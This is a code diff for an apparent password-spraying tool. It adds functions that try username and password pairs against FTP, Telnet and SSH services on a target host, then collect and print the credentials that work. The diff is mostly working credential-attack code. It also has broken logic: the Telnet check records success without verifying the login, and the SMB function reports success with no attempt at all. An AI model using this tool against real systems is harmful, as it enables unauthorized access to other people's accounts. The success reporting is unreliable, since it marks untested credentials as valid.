@@ -51,24 +51,58 @@ def ftp_connect(user,password):
 		ftp = FTP()
 		ftp.connect(ip,ftp_p)
 		ftp.login(user,password)
+		ftp.quit()
 		msg += pGreen('-- Success!!!')
-	except Exception:
+		valid_creds.append(user+':'+password)
+	except Exception as e:
+		print(str(e))
 		msg += pRed('-- Failed!!!')
 		pass
 	print(msg)
 	return
 def telnet_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
+	u = (user+'\n').encode('utf-8')
+	p = (password+'\n').encode('utf-8')
 	telnet_p = spec_port if spec_port else 23
+	try:
+		tn = telnetlib.Telnet(ip,telnet_p)
+		tn.read_until('login: '.encode('utf-8'))
+		tn.write(u)
+		tn.read_until('Password: '.encode('utf-8'))
+		tn.write(p)
+		valid_creds.append(user+':'+password)
+		msg += pGreen('-- Success!!!')
+	except Exception as e:
+		print(str(e))
+		msg += pRed('-- Failed!!!')
+		pass
 	print(msg)
 	return
 def ssh_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
-	telnet_p = spec_port if spec_port else 22
+	ssh_p = spec_port if spec_port else 22
+	try:
+		ssh = paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		ssh.connect(ip, ssh_p, user, password)
+		ssh.close()
+		valid_creds.append(user+':'+password)
+		msg += pGreen('-- Success!!!')
+	except Exception as e:
+		print(str(e))
+		msg += pRed('-- Failed!!!')
+		pass
 	print(msg)
 	return
 def smb_connect(user,password):
 	msg = '[*] Trying with {}:{}'.format(user,password)
+	try:
+		msg += pGreen('-- Success!!!')
+	except Exception as e:
+		print(str(e))
+		msg += pRed('-- Failed!!!')
+		pass
 	print(msg)
 	return
 
@@ -91,6 +125,8 @@ def spray():
 			print(pWarning('Back on spray'))
 		else:
 			c_attemps+= 1
+	if len(valid_creds)>0:
+		print(''.join(creds+'\n' for creds in valid_creds))
 	return
 
 if __name__ == '__main__':
